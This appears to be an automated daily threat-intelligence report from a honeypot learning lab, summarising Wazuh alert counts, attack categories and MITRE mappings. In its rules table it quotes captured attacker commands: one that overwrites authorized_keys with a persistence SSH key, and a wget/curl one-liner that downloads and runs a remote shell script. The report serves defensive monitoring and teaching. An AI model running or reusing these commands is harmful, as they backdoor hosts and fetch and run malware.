# LearningLab01 Daily Threat Intelligence Report — 2026-10-19

Generated: 2026-10-19T13:15:05.049Z

Report window: 2026-10-18T13:15:05.026Z through 2026-10-19T13:15:05.026Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 379,614 |
| Attack-related alerts | 25,678 |
| Honeypot interactions | 368,544 |
| Authentication failures | 3,803 |
| Authentication successes | 468 |
| Critical alerts | 128 |
| High alerts | 436 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 128 critical-severity alerts require priority review.
- 436 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 8.13:1.
- Country attribution currently covers only 0.30% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (302,626 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 128 | 0.03% |
| High | 436 | 0.11% |
| Medium | 2,331 | 0.61% |
| Low | 376,719 | 99.24% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 3,803
- Authentication successes: 468
- Failure-to-success ratio: 8.13:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 19,354 | 75.37% |
| Payload delivery | 19,354 | 75.37% |
| Authentication failure | 3,803 | 14.81% |
| Command execution | 1,386 | 5.40% |
| Reconnaissance | 607 | 2.36% |
| Network scan | 286 | 1.11% |
| Malware | 117 | 0.46% |
| Web attack | 110 | 0.43% |
| SMTP attack | 88 | 0.34% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 1,121 alerts, representing 0.30% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 378,493 | 99.70% | Not geolocated |
| Bulgaria | 582 | 0.15% | ████████████████████ |
| United Kingdom | 188 | 0.05% | ██████ |
| Germany | 163 | 0.04% | ██████ |
| Romania | 96 | 0.03% | ███ |
| United States | 74 | 0.02% | ███ |
| China | 6 | 0.00% | █ |
| Ukraine | 4 | 0.00% | █ |
| Canada | 3 | 0.00% | █ |
| Singapore | 3 | 0.00% | █ |
| Hong Kong | 2 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 76 |
| Execution | 33 |
| Impact | 11 |
| Command and Control | 2 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 76 |
| Command and Scripting Interpreter | 33 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 2 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 302,626 | T-Pot RDP connection from [IP address] to port 3389. | tpot (302,626) |
| 110204 | 4 | 40,137 | T-Pot Honeytrap connection from [IP address] to port 5901 | tpot (40,137) |
| 110205 | 6 | 19,289 | T-Pot Honeytrap received a payload from [IP address] | tpot (19,289) |
| 110101 | 3 | 4,615 | Cowrie SSH connection from [IP address]. | tpot (4,615) |
| 110207 | 5 | 3,826 | T-Pot SentryPeer SIP activity from [IP address]:64316, method INVITE | tpot (3,826) |
| 110102 | 5 | 3,803 | Cowrie failed login from [IP address] using username root. | tpot (3,803) |
| 110104 | 7 | 1,223 | Cowrie captured a command from [IP address]: g & k \| zpkfq | tpot (1,223) |
| 110219 | 4 | 828 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (828) |
| 110201 | 4 | 725 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (725) |
| 110214 | 9 | 285 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (285) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110221 | 7 | 207 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (207) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110103 | 10 | 177 | Cowrie accepted login from [IP address] using username zalee	. | tpot (177) |
| 5502 | 3 | 173 | PAM: Login session closed. | tpot (171), wazuh (2) |
| 110109 | 13 | 128 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (128) |
| 110215 | 4 | 116 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (116) |
| 110216 | 4 | 112 | T-Pot Mailoney received SMTP command from [IP address]: EHLO [IP address]  | tpot (112) |
| 110223 | 5 | 110 | T-Pot HoneyAML received  request from  to  on port . | tpot (110) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110217 | 7 | 88 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (88) |
| 110220 | 8 | 83 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (83) |
| 110105 | 12 | 82 | Cowrie captured a file download from [IP address]. | tpot (82) |
| 203 | 9 | 82 | Agent event queue is full. Events may be lost. | tpot (82) |
| 110106 | 10 | 76 | Cowrie detected repeated failed logins from [IP address]. | tpot (76) |
| 110212 | 10 | 65 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (65) |
| 202 | 7 | 42 | Agent event queue is 90% full. | tpot (42) |
| 205 | 3 | 42 | Agent event queue is back to normal load. | tpot (42) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110108 | 12 | 33 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (33) |
| 110208 | 7 | 22 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:15696 | tpot (22) |
| 110209 | 5 | 20 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Get | tpot (20) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110222 | 9 | 3 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (3) |
| 110107 | 12 | 2 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 86003 | 3 | 2 | Docker: Error message | tpot (2) |
| 110211 | 9 | 1 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (1) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
